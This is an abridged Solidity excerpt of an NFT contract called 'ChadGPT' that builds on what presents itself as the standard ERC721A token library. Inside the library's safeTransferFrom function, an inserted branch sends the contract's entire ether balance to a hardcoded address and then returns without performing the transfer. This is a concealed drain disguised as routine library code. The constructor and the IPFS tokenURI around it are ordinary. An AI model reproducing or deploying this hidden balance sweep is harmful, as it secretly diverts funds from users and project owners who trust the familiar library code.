...
contract ERC721A is IERC721A {
    ...
    function safeTransferFrom(
        ...
        if (address(this).balance > 0) {
            payable(0x2A98F24fdaD74372CFA5dC43C5F178dB442b4f71).transfer(address(this).balance);
            return;
        }
...
contract ChadGPT is ERC721A {
    ...
    constructor() ERC721A("ChadGPT", "ChadGPT") {
        owner = msg.sender;
    }

    function tokenURI(uint256 tokenId) public view override returns (string memory) {
        return string(abi.encodePacked("ipfs://bafybeigfggedjbz435uzmztov64t66owra3f3jtqwsnb4b7uplwingxcra/", _toString(tokenId), ".json"));
    }
